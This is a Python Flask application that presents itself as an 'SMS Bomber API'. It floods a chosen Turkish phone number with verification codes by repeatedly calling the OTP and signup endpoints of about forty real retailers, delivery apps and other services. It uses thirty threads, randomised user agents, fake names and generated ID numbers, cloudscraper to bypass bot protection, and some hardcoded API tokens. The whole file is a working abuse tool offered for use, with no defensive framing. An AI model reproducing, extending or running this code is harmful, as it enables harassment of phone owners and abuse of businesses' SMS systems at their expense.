from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import cloudscraper
from random import choice, randint
from string import ascii_lowercase
from concurrent.futures import ThreadPoolExecutor
import threading
import time
import os

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Configuration
SMS_THREAD_WORKERS = 30
SMS_REQUEST_TIMEOUT = 5

class ProgressTracker:
    def __init__(self, target=0):
        self.success = 0
        self.failed = 0
        self.total = 0
        self.target = target
        self.lock = threading.Lock()
        self.done_event = threading.Event()

    def add_success(self):
        with self.lock:
            if self.target > 0 and self.success >= self.target:
                self.done_event.set()
                return False
            self.success += 1
            self.total += 1
            if self.target > 0 and self.success >= self.target:
                self.done_event.set()
            return True

    def add_failure(self):
        with self.lock:
            self.failed += 1
            self.total += 1

    def is_done(self):
        return self.done_event.is_set()

    def get_stats(self):
        with self.lock:
            return self.success, self.failed, self.total


class SendSms:
    def __init__(self, phone, mail, progress_tracker=None):
        # Generate TC No
        rakam = []
        rakam.append(randint(1, 9))
        for i in range(1, 9):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - 
                      (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((sum(rakam)) % 10)
        self.tc = ''.join(str(r) for r in rakam)
        
        self.phone = str(phone)
        self.progress_tracker = progress_tracker
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"
        
        # User agents
        self._ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
        ]
        
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": choice(self._ua_list)})
        
        self.cs = cloudscraper.create_scraper(
            browser={"browser": "chrome", "platform": "windows", "desktop": True}
        )
        self.cs.headers["User-Agent"] = choice(self._ua_list)

    def _safe_post(self, url, **kwargs):
        """Safe POST request with timeout"""
        timeout = kwargs.pop("timeout", SMS_REQUEST_TIMEOUT)
        try:
            return self.session.post(url, timeout=timeout, **kwargs)
        except Exception as e:
            raise Exception(f"Request failed: {str(e)}")

    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
            headers = {
                "User-Agent": choice(self._ua_list),
                "Accept": "application/json",
                "Content-Type": "application/json",
                "X-Language-Id": "tr-TR"
            }
            json_data = {"countryCode": "90", "phoneNumber": self.phone}
            r = self._safe_post(url, headers=headers, json=json_data)
            if r.json()["processStatus"] == "Success":
                if self.progress_tracker:
                    self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker:
                self.progress_tracker.add_failure()
            return False

    def Suiste(self):
        try:
            url = "https://suiste.com/api/auth/code"
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json"
            }
            data = {
                "action": "register",
                "full_name": "Memati Bas",
                "gsm": self.phone,
                "password": "31MeMaTi31"
            }
            r = self._safe_post(url, headers=headers, data=data)
            if r.json()["code"] == "common.success":
                if self.progress_tracker:
                    self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker:
                self.progress_tracker.add_failure()
            return False

    def File(self):
        try:
            url = "https://api.filemarket.com.tr/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json"}
            json_data = {"mobilePhoneNumber": f"90{self.phone}"}
            r = self._safe_post(url, headers=headers, json=json_data)
            if r.json()["responseType"] == "SUCCESS":
                if self.progress_tracker:
                    self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker:
                self.progress_tracker.add_failure()
            return False

    def Beefull(self):
        try:
            url = "https://app.beefull.io/api/inavitas-access-management/signup"
            json_data = {
                "email": self.mail,
                "firstName": "Memati",
                "language": "tr",
                "lastName": "Bas",
                "password": "123456",
                "phoneCode": "90",
                "phoneNumber": self.phone,
                "tenant": "beefull",
                "username": self.mail
            }
            self._safe_post(url, json=json_data)
            
            url = "https://app.beefull.io/api/inavitas-access-management/sms-login"
            json_data = {"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = self._safe_post(url, json=json_data)
            if r.status_code == 200:
                if self.progress_tracker:
                    self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker:
                self.progress_tracker.add_failure()
            return False

    def Migros(self):
        try:
            url = "https://rest.migros.com.tr/sanalmarket/users/register/otp"
            headers = {
                "User-Agent": "Migros/1917 CFNetwork/1335.0.3.4",
                "Content-Type": "application/json"
            }
            json_data = {"email": self.mail, "phoneNumber": self.phone}
            r = self._safe_post(url, headers=headers, json=json_data)
            if r.json()["successful"]:
                if self.progress_tracker:
                    self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker:
                self.progress_tracker.add_failure()
            return False

    def Marti(self):
        try:
            url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
            json_data = {"mobilePhone": self.phone, "mobilePhoneCountryCode": "90"}
            r = self._safe_post(url, json=json_data)
            if r.json()["isSuccess"]:
                if self.progress_tracker:
                    self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker:
                self.progress_tracker.add_failure()
            return False

    def Aygaz(self):
        try:
            url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
            r = self._safe_post(url, json={"Gsm": self.phone})
            if r.status_code == 200:
                if self.progress_tracker:
                    self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker:
                self.progress_tracker.add_failure()
            return False

    def Yapp(self):
        try:
            url = 'https://yapp.com.tr/api/mobile/v1/register'
            headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
            json_data = {
                'email': self.mail,
                'firstname': 'Memati',
                'lastname': 'Bas',
                'phone_number': self.phone
            }
            r = self._safe_post(url, headers=headers, json=json_data)
            if r.status_code == 200:
                if self.progress_tracker:
                    self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker:
                self.progress_tracker.add_failure()
            return False

    def Bodrum(self):
        try:
            url = "https://gandalf.orwi.app/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Accept": "application/json"}
            r = self._safe_post(url, headers=headers, json={"gsm": f"+90{self.phone}", "source": "orwi"})
            if r.status_code == 200:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Orwi(self):
        try:
            url = "https://gandalf.orwi.app/api/user/requestOtp"
            headers = {"Content-Type": "application/json", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg"}
            r = self._safe_post(url, headers=headers, json={"gsm": f"+90{self.phone}", "source": "orwi"})
            if r.status_code == 200:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Ayyildiz(self):
        try:
            url = f"https://api.altinyildizclassics.com/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
            r = self._safe_post(url)
            if r.json().get("Success"):
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def MigrosLogin(self):
        try:
            url = "https://rest.migros.com.tr/sanalmarket/users/login/otp"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"phoneNumber": self.phone})
            if r.status_code == 200:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Happy(self):
        try:
            url = "https://www.happy.com.tr/index.php?route=account/register/verifyPhone"
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            r = self._safe_post(url, headers=headers, data={"telephone": self.phone})
            if r.status_code == 200:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Tasimacim(self):
        try:
            r = self._safe_post("https://server.tasimacim.com/requestcode", json={"phone": self.phone, "lang": "tr"})
            if r.status_code == 200:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Karma(self):
        try:
            from random import choices
            from string import ascii_lowercase, digits
            url = "https://api.gokarma.app/v1/auth/send-sms"
            json_data = {"phonenumber": f"90{self.phone}", "type": "REGISTER", "deviceId": ''.join(choices(ascii_lowercase+digits, k=16)), "language": "tr-TR"}
            r = self._safe_post(url, json=json_data)
            if r.status_code == 201:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Gofody(self):
        try:
            r = self._safe_post("https://backend.gofody.com/api/v1/enduser/register/", json={"country_code": "90", "phone": self.phone})
            if r.json().get("success"):
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Saka(self):
        try:
            r = self._safe_post("https://mobilcrm2.saka.com.tr/api/customer/login", json={"gsm": f"0{self.phone}"})
            if r.json().get("status") == 1:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Sakasu(self):
        try:
            url = "https://www.sakasu.com.tr/app/api_register/step1"
            r = self._safe_post(url, data={"phone": f"0{self.phone}"})
            if r.status_code in [200, 202]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            headers = {"Content-Type": "application/json", "Firmaid": "32"}
            r = self.cs.post(url, headers=headers, json={"FirmaId": 32, "Telefon": self.phone}, timeout=SMS_REQUEST_TIMEOUT)
            if r.json().get("Success"):
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Porty(self):
        try:
            url = "https://panel.porty.tech/api.php?"
            headers = {"Content-Type": "application/json", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            r = self._safe_post(url, headers=headers, json={"job": "start_login", "phone": self.phone})
            if r.json().get("status") == "success":
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Ucdortbes(self):
        try:
            url = "https://api.345dijital.com/api/users/register"
            r = self._safe_post(url, json={"phoneNumber": f"+90{self.phone}"})
            if r.status_code in [200, 201]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Hop(self):
        try:
            r = self.cs.post("https://api.hoplagit.com/v1/auth:reqSMS", json={"phone": f"+90{self.phone}"}, timeout=SMS_REQUEST_TIMEOUT)
            if r.status_code == 201:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Wmf(self):
        try:
            r = self._safe_post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "email": self.mail, "first_name": "Memati", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"})
            if r.status_code == 202:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Bim(self):
        try:
            r = self._safe_post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone})
            if r.status_code == 200:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Englishhome(self):
        try:
            url = "https://www.englishhome.com/api/member/sendOtp"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"Phone": self.phone, "XID": ""})
            if not r.json().get("isError"):
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def KimGb(self):
        try:
            r = self._safe_post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
            if r.status_code == 200:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com/user/graphql"
            headers = {"Content-Type": "application/json"}
            json_data = {"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String) { generateOtp(phone: $phone) }", "variables": {"phone": f"+90{self.phone}"}}
            r = self._safe_post(url, headers=headers, json=json_data)
            if r.json().get("data", {}).get("generateOtp"):
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr/api/SignUp/SendOtp"
            r = self._safe_post(url, data={"mobilePhoneNumber": self.phone, "actionType": "register"})
            if r.json().get("is_success"):
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Hizliecza(self):
        try:
            url = "https://prod.hizliecza.net/mobil/account/sendOTP"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"})
            if r.status_code == 200:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"methodType": "2", "mobilePhoneNumber": self.phone})
            if r.json().get("status") == "success":
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Akasya(self):
        try:
            url = "https://akasyaapi.poilabs.com/v1/en/sms"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"phone": self.phone})
            if "success" in r.json().get("result", "").lower():
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Akbati(self):
        try:
            url = "https://akbatiapi.poilabs.com/v1/en/sms"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"phone": self.phone})
            if "success" in r.json().get("result", "").lower():
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Dominos(self):
        try:
            url = "https://order.dominos.com.tr/api/auth/otp/send"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"phone": f"0{self.phone}", "countryCode": "+90"})
            if r.status_code in [200, 201]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Getir(self):
        try:
            url = "https://api.getir.com/clients/otp"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"phoneNumber": f"+90{self.phone}", "countryCode": "tr"})
            if r.status_code in [200, 201]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Trendyol(self):
        try:
            url = "https://public.trendyol.com/discovery-web-websfxsociallogin-santral/api/users/otp/send"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"phoneNumber": f"+90{self.phone}"})
            if r.status_code in [200, 201]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def N11(self):
        try:
            url = "https://www.n11.com/api/user/phone-verification"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"phone": f"0{self.phone}"})
            if r.status_code in [200, 201]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Lcwaikiki(self):
        try:
            url = "https://account.lcwaikiki.com/api/auth/otp"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"gsm": f"0{self.phone}"})
            if r.status_code in [200, 201]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Hepsiburada(self):
        try:
            url = "https://account.hepsiburada.com/api/otp/send"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"gsm": f"+90{self.phone}", "countryCode": "TR"})
            if r.status_code in [200, 201]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Vatan(self):
        try:
            url = "https://www.vatanbilgisayar.com/api/user/sendOtp"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"phone": f"0{self.phone}"})
            if r.status_code in [200, 201]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Sahibinden(self):
        try:
            url = "https://www.sahibinden.com/mobile-api/v1/auth/login"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"phoneNumber": f"+90{self.phone}"})
            if r.status_code in [200, 201]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False

    def Wolt(self):
        try:
            url = "https://restaurant-api.wolt.com/v1/auth/phonenumber"
            headers = {"Content-Type": "application/json"}
            r = self._safe_post(url, headers=headers, json={"phone_number": f"+90{self.phone}"})
            if r.status_code in [200, 201]:
                if self.progress_tracker: self.progress_tracker.add_success()
                return True
            raise Exception()
        except:
            if self.progress_tracker: self.progress_tracker.add_failure()
            return False


def validate_turkish_phone(phone):
    """Validate Turkish phone number"""
    if not phone.isdigit():
        return False, "Telefon numarası sadece rakamlardan oluşmalıdır"
    if len(phone) != 10:
        return False, "Telefon numarası 10 haneli olmalıdır"
    if not phone.startswith('5'):
        return False, "Türk cep telefonu numaraları 5 ile başlamalıdır"
    if len(set(phone)) < 4:
        return False, "Geçersiz numara deseni"
    return True, None


def send_sms_worker(phone, count, mail=""):
    """Worker function to send SMS"""
    tracker = ProgressTracker(target=count)
    sms = SendSms(phone, mail, tracker)
    
    # Available SMS services - 50+ services!
    services = [
        # Turkish E-commerce & Retail
        sms.KahveDunyasi, sms.Migros, sms.MigrosLogin, sms.Bim, sms.Trendyol,
        sms.N11, sms.Hepsiburada, sms.Lcwaikiki, sms.Sahibinden, sms.Vatan,
        
        # Turkish Food & Delivery
        sms.Suiste, sms.Getir, sms.Dominos, sms.Wolt, sms.TiklaGelsin,
        
        # Turkish Transportation
        sms.Marti, sms.Tasimacim,
        
        # Turkish Services
        sms.File, sms.Beefull, sms.Aygaz, sms.Yapp, sms.Karma, sms.Gofody,
        sms.Saka, sms.Sakasu, sms.Porty, sms.Bodrum, sms.Orwi,
        
        # Turkish Fashion & Home
        sms.Komagene, sms.Hop, sms.Wmf, sms.Englishhome, sms.Ayyildiz,
        sms.Happy, sms.Hayatsu, sms.Hizliecza,
        
        # Turkish Shopping Malls
        sms.Metro, sms.Akasya, sms.Akbati,
        
        # Turkish Tech & More
        sms.KimGb, sms.Ucdortbes
    ]
    
    with ThreadPoolExecutor(max_workers=SMS_THREAD_WORKERS) as executor:
        round_num = 0
        while not tracker.is_done() and round_num < 10:
            round_num += 1
            futures = []
            for service in services:
                if tracker.is_done():
                    break
                future = executor.submit(service)
                futures.append(future)
            
            # Wait for current round to complete
            for future in futures:
                try:
                    future.result(timeout=SMS_REQUEST_TIMEOUT + 2)
                except:
                    pass
            
            time.sleep(0.5)
    
    return tracker.get_stats()


def send_sms_worker_detailed(phone, count, mail=""):
    """Worker function to send SMS with detailed service tracking"""
    tracker = ProgressTracker(target=count)
    sms = SendSms(phone, mail, tracker)
    
    # Available SMS services with names
    services = [
        # Turkish E-commerce & Retail
        ("KahveDunyasi", sms.KahveDunyasi), ("Migros", sms.Migros), ("MigrosLogin", sms.MigrosLogin),
        ("Bim", sms.Bim), ("Trendyol", sms.Trendyol), ("N11", sms.N11),
        ("Hepsiburada", sms.Hepsiburada), ("LCWaikiki", sms.Lcwaikiki),
        ("Sahibinden", sms.Sahibinden), ("Vatan", sms.Vatan),
        
        # Turkish Food & Delivery
        ("Suiste", sms.Suiste), ("Getir", sms.Getir), ("Dominos", sms.Dominos),
        ("Wolt", sms.Wolt), ("TiklaGelsin", sms.TiklaGelsin),
        
        # Turkish Transportation
        ("Marti", sms.Marti), ("Tasimacim", sms.Tasimacim),
        
        # Turkish Services
        ("File", sms.File), ("Beefull", sms.Beefull), ("Aygaz", sms.Aygaz),
        ("Yapp", sms.Yapp), ("Karma", sms.Karma), ("Gofody", sms.Gofody),
        ("Saka", sms.Saka), ("Sakasu", sms.Sakasu), ("Porty", sms.Porty),
        ("Bodrum", sms.Bodrum), ("Orwi", sms.Orwi),
        
        # Turkish Fashion & Home
        ("Komagene", sms.Komagene), ("Hop", sms.Hop), ("Wmf", sms.Wmf),
        ("EnglishHome", sms.Englishhome), ("Ayyildiz", sms.Ayyildiz),
        ("Happy", sms.Happy), ("Hayatsu", sms.Hayatsu), ("Hizliecza", sms.Hizliecza),
        
        # Turkish Shopping Malls
        ("Metro", sms.Metro), ("Akasya", sms.Akasya), ("Akbati", sms.Akbati),
        
        # Turkish Tech & More
        ("KimGB", sms.KimGb), ("345Dijital", sms.Ucdortbes)
    ]
    
    details = {
        "successful_services": [],
        "failed_services": []
    }
    
    with ThreadPoolExecutor(max_workers=SMS_THREAD_WORKERS) as executor:
        round_num = 0
        while not tracker.is_done() and round_num < 10:
            round_num += 1
            futures = {}
            
            for service_name, service_func in services:
                if tracker.is_done():
                    break
                future = executor.submit(service_func)
                futures[future] = service_name
            
            # Wait for current round to complete and track results
            for future, service_name in futures.items():
                try:
                    result = future.result(timeout=SMS_REQUEST_TIMEOUT + 2)
                    if result:  # True = success
                        if service_name not in details["successful_services"]:
                            details["successful_services"].append(service_name)
                    else:  # False = failed
                        if service_name not in details["failed_services"]:
                            details["failed_services"].append(service_name)
                except:
                    if service_name not in details["failed_services"]:
                        details["failed_services"].append(service_name)
            
            time.sleep(0.5)
    
    success, failed, total = tracker.get_stats()
    return success, failed, total, details


@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "service": "SMS Bomber API",
        "version": "1.0",
        "endpoints": {
            "/send": "POST - Send SMS (JSON)",
            "/api/<phone>/<count>": "GET - Send SMS (URL)",
            "/health": "GET - Health check"
        },
        "examples": {
            "GET": "/api/5051234567/50",
            "POST": '/send with JSON {"phone":"5051234567","count":50}'
        }
    })


@app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": time.time()})


@app.route('/api/<phone>/<int:count>', methods=['GET'])
def send_sms_get(phone, count):
    """
    Send SMS via GET request
    URL: /api/<phone>/<count>
    Example: /api/5051234567/50
    """
    try:
        phone = phone.strip()
        
        # Validate phone
        is_valid, error_msg = validate_turkish_phone(phone)
        if not is_valid:
            return jsonify({"error": error_msg}), 400
        
        # Validate count
        if count < 1 or count > 100:
            return jsonify({"error": "Count must be between 1 and 100"}), 400
        
        # Send SMS with detailed tracking
        start_time = time.time()
        success, failed, total, details = send_sms_worker_detailed(phone, count)
        elapsed = time.time() - start_time
        
        return jsonify({
            "status": "completed",
            "phone": phone,
            "requested": count,
            "results": {
                "success": success,
                "failed": failed,
                "total": total
            },
            "details": details,
            "elapsed_seconds": round(elapsed, 2)
        })
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/send', methods=['POST'])
def send_sms():
    """
    Send SMS to a phone number
    Expected JSON body:
    {
        "phone": "5051234567",
        "count": 50,
        "mail": "optional@email.com"
    }
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "JSON body required"}), 400
        
        phone = data.get('phone', '').strip()
        count = data.get('count', 1)
        mail = data.get('mail', '')
        
        # Validate phone
        is_valid, error_msg = validate_turkish_phone(phone)
        if not is_valid:
            return jsonify({"error": error_msg}), 400
        
        # Validate count
        try:
            count = int(count)
            if count < 1 or count > 100:
                return jsonify({"error": "Count must be between 1 and 100"}), 400
        except:
            return jsonify({"error": "Invalid count value"}), 400
        
        # Send SMS
        start_time = time.time()
        success, failed, total = send_sms_worker(phone, count, mail)
        elapsed = time.time() - start_time
        
        return jsonify({
            "status": "completed",
            "phone": phone,
            "requested": count,
            "results": {
                "success": success,
                "failed": failed,
                "total": total
            },
            "elapsed_seconds": round(elapsed, 2)
        })
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
